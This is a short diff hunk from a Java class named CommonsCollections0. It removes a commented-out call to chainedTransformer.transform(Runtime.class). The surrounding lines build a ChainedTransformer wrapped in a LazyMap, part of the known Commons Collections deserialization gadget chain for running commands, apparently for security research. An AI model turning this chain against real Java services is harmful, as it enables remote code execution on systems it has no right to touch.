@@ -54,7 +54,6 @@ public class CommonsCollections0 {
         };
 
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-//      chainedTransformer.transform(Runtime.class);
         HashMap<Object,Object> hashMap = new HashMap<>();
         Map<Object,Object> lazyMap = LazyMap.decorate(hashMap,chainedTransformer);
 
